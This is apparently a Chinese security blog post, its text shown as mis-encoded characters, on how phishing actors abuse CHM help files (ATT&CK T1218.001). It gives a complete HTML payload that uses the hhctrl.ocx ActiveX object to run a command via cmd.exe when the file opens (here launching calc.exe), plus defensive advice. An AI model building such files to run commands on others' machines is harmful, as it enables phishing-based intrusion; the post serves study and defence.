---
title: "é‚®ä»¶é’“é±¼ä¸T1218.001"
date: 2023-09-18
description: ä»Šå¤©ä¸­åˆçœ‹åˆ°ä¸€ä»½å…³äºBitterç»„ç»‡é’ˆå¯¹äºšå¤ªåœ°åŒºèƒ½æºéƒ¨é—¨å‘èµ·é’“é±¼æ´»åŠ¨åˆ†ææŠ¥å‘Šï¼Œå…¶ä¸­@Ryan Robinson 2023å¹´3æœˆ24æ—¥å¯¹è¯¥ç»„ç»‡ä½¿ç”¨çš„CHMæ ·æœ¬è¿›è¡Œäº†åˆ†æã€‚äºæ˜¯å¼€å§‹è¯¦ç»†äº†è§£ä¸ºä»€ä¹ˆCHMæ ¼å¼åœ¨é’“é±¼ä¸­å¯ä»¥å‘æŒ¥å¦‚æ­¤å¤§çš„ä»·å€¼ã€‚
url: /archivers/2023-09-18/phishing
tags: [phishing]
---

<aside>
ğŸ“Œ æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨ç¼–è¯‘çš„ HTML æ–‡ä»¶ ï¼ˆ.chmï¼‰ æ¥éšè—æ¶æ„ä»£ç ã€‚CHMæ–‡ä»¶é€šå¸¸ä½œä¸ºMicrosoft HTMLå¸®åŠ©ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†åˆ†å‘ã€‚CHMæ–‡ä»¶æ˜¯å„ç§å†…å®¹çš„å‹ç¼©ç¼–è¯‘ï¼Œå¦‚HTMLæ–‡æ¡£ï¼Œå›¾åƒå’Œè„šæœ¬/Webç›¸å…³çš„ç¼–ç¨‹è¯­è¨€ï¼Œå¦‚VBAï¼ŒJScriptï¼ŒJavaå’ŒActiveXã€‚CHM å†…å®¹ä½¿ç”¨ç”± HTML å¸®åŠ©å¯æ‰§è¡Œç¨‹åº ï¼ˆhh.exeï¼‰ åŠ è½½çš„ Internet Explorer æµè§ˆå™¨çš„åŸºç¡€ç»„ä»¶æ˜¾ç¤ºã€‚ - æ‘˜è‡ª ATT&CK [System Binary Proxy Execution: Compiled HTML File, Sub-technique T1218.001 - Enterprise | MITRE ATT&CKÂ®](https://attack.mitre.org/techniques/T1218/001/)

</aside>

## èƒŒæ™¯

![0](https://images.payloads.online/2024-07-29-9c23ae3e32974727854fe650b5d94e641f5d33fa6fff2ff2aca32a224127b8e4.png)  


ä»Šå¤©ä¸­åˆçœ‹åˆ°ä¸€ä»½å…³äº[Bitterç»„ç»‡é’ˆå¯¹äºšå¤ªåœ°åŒºèƒ½æºéƒ¨é—¨å‘èµ·é’“é±¼æ´»åŠ¨](https://intezer.com/blog/research/phishing-campaign-targets-nuclear-energy-industry/)åˆ†ææŠ¥å‘Šï¼Œå…¶ä¸­@Ryan Robinson 2023å¹´3æœˆ24æ—¥å¯¹è¯¥ç»„ç»‡ä½¿ç”¨çš„CHMæ ·æœ¬è¿›è¡Œäº†åˆ†æã€‚äºæ˜¯å¼€å§‹è¯¦ç»†äº†è§£ä¸ºä»€ä¹ˆCHMæ ¼å¼åœ¨é’“é±¼ä¸­å¯ä»¥å‘æŒ¥å¦‚æ­¤å¤§çš„ä»·å€¼ã€‚

## CHMæ–‡ä»¶æ‰“å¼€çš„è¿‡ç¨‹

CHMæ–‡ä»¶æ˜¯å„ç§å†…å®¹çš„å‹ç¼©ç¼–è¯‘ï¼Œå¦‚HTMLæ–‡æ¡£ï¼Œå›¾åƒå’Œè„šæœ¬/Webç›¸å…³çš„ç¼–ç¨‹è¯­è¨€ï¼Œåœ¨CHMæ‰“å¼€æ—¶ï¼Œä¼šè°ƒç”¨IEæµè§ˆå™¨çš„åŸºç¡€ç»„ä»¶è§£ææ˜¾ç¤º,åŒå‡»æ‰“å¼€CHMæ–‡ä»¶å…¶å®æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ªhh.exeçš„è¿›ç¨‹ã€‚

![1](https://images.payloads.online/2024-07-29-eab40d97f6ec3c24b6f998a624539ba37ed83871a7c7c07c00dddb5dad7d9ce9.png)  


## CHMçš„Payload

CHMæ–‡ä»¶å¯ä»¥é€šè¿‡hh.exeè¿›è¡Œåç¼–è¯‘ï¼š

```bash
hh.exe -decompile %temp%  payload.chm
```

### å¦‚ä½•æ„å»ºCHMæ–‡ä»¶ï¼Ÿ

å¯ä»¥ä½¿ç”¨`Microsoft HTML Help Workshop`å·¥å…·åˆ›å»ºCHMæ–‡ä»¶ï¼ŒFILESæŒ‡çš„æ˜¯ç›®å½•ï¼ŒOPTIONSæŒ‡çš„æ˜¯æ–‡æ¡£åŸºæœ¬ä¿¡æ¯ï¼š

![2](https://images.payloads.online/2024-07-29-46f7eb69f2f9cfa3972058713818f15955e891fb99252bae45c6209f88a87e69.png)  


```html
<html>
    <head>
<OBJECT id="Test" type="application/x-oleobject" classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" codebase="hhctrl.ocx#Version=5,02,3790,1194" width="1" height="1">
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",cmd.exe, /c calc.exe">
<PARAM name="Item2" value="273,1,1">
</object>
<script>
Test.HHClick();
</script>
</head>
<body>
<h1>Hello</h1>
</body>
</html>
```

åœ¨è¿™æ®µä»£ç ä¸­ï¼Œè°ƒç”¨äº†`hhctrl.ocx`COMç»„ä»¶ï¼Œè¯¥ç»„ä»¶çš„æ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š

![3](https://images.payloads.online/2024-07-29-037a6f715f47a2e3cde7a7ab2ce97301f632f4858252dfaf9196e8a54ba4da84.png)  

COMç»„ä»¶æ–¹æ³•åˆ—è¡¨ï¼š[CLSID 52A2AAAE-085D-4187-97EA-8C30DB990436 | HHCtrl Object | STRONTIC](https://strontic.github.io/xcyclopedia/library/clsid_52A2AAAE-085D-4187-97EA-8C30DB990436.html)

![4](https://images.payloads.online/2024-07-29-c1ef1cd6eac332ebc0ad3f7fdb6c7a8827454261cc4f41152542bda3581dd8d2.png)  


Atomic [atomic-red-team/atomics/T1218.001/src/T1218.001.html at master Â· redcanaryco/atomic-red-team (github.com)](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/src/T1218.001.html) ç»™å‡ºçš„æµ‹è¯•ç”¨ä¾‹ä»£ç è°ƒç”¨çš„æ˜¯Clickæ–¹æ³•ï¼Œæˆ‘æµ‹è¯•äº†HHClickä¹Ÿèƒ½å¤Ÿè§¦å‘ã€‚

æˆ‘åœ¨æœ¬åœ°å°è¯•ç¼–è¯‘äº†ä¸€ä¸ªå¼¹å‡ºè®¡ç®—å™¨çš„CHMæ–‡æ¡£ï¼Œä¸Šä¼ è‡³VirusTotalè¿›è¡Œåˆ†æï¼š

![5](https://images.payloads.online/2024-07-29-af545bb4f3c853f8a569cf68ab877948a6cf8feb189f79701163af63aaa54b57.png)  

åœ¨ATT&CKä¸­ä¹Ÿæåˆ°æœ‰æ”»å‡»ç»„ç»‡é‡‡ç”¨è°ƒç”¨ActiveXå¯¹è±¡çš„æ–¹æ³•æ¥å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œè¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¸ä¼šåˆ›å»ºè¿›ç¨‹ï¼š

![6](https://images.payloads.online/2024-07-29-8beb342548a5e4d3c052715bd5b4e0fb7e7a602d5988fb65547c432a0eeb420d.png)  

## CHMæ–‡ä»¶æ‰§è¡Œå‘½ä»¤çš„é˜²å¾¡æªæ–½

è¿™é‡Œå¯ä»¥ç›´æ¥æ€»ç»“ä¸€ä¸‹ATT&CKçŸ©é˜µä¸Šçš„å»ºè®®ï¼š

1. é˜»æ­¢CHMæ–‡ä»¶çš„ä¸‹è½½
2. è¿›ç¨‹ç›‘æ§ï¼Œç›‘è§†å’Œåˆ†æhh.exeçš„æ‰§è¡Œå’Œå‚æ•°ã€‚å°†æœ€è¿‘è°ƒç”¨çš„hh.exeä¸å·²çŸ¥è‰¯å¥½å‚æ•°çš„å…ˆå‰å†å²è®°å½•è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ç¡®å®šå¼‚å¸¸å’Œæ½œåœ¨çš„å¯¹æŠ—æ€§æ´»åŠ¨ï¼ˆä¾‹å¦‚ï¼šæ··æ·†å’Œ/æˆ–æ¶æ„å‘½ä»¤ï¼‰ã€‚éæ ‡å‡†è¿›ç¨‹æ‰§è¡Œæ ‘ä¹Ÿå¯èƒ½æŒ‡ç¤ºå¯ç–‘æˆ–æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ï¼Œå¦‚æœhh.exeæ˜¯ä¸å…¶ä»–å¯¹æŠ—æ€§æŠ€æœ¯ç›¸å…³çš„å¯ç–‘è¿›ç¨‹å’Œæ´»åŠ¨çš„çˆ¶è¿›ç¨‹ã€‚

## å‚è€ƒ

- [CLSID 52A2AAAE-085D-4187-97EA-8C30DB990436 | HHCtrl Object | STRONTIC](https://strontic.github.io/xcyclopedia/library/clsid_52A2AAAE-085D-4187-97EA-8C30DB990436.html)
- [Phishing Campaign Targets Chinese Nuclear Energy Industry (intezer.com)](https://intezer.com/blog/research/phishing-campaign-targets-nuclear-energy-industry/)
- [T1218.001 - Explore Atomic Red Team](https://atomicredteam.io/defense-evasion/T1218.001/)
- [atomic-red-team/atomics/T1218.001/src/T1218.001.html at master Â· redcanaryco/atomic-red-team (github.com)](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/src/T1218.001.html)
- [System Binary Proxy Execution: Compiled HTML File, Sub-technique T1218.001 - Enterprise | MITRE ATT&CKÂ®](https://attack.mitre.org/techniques/T1218/001/)
- [Microsoft HTML Help Workshop](https://www.helpndoc.com/downloads/htmlhelp.exe)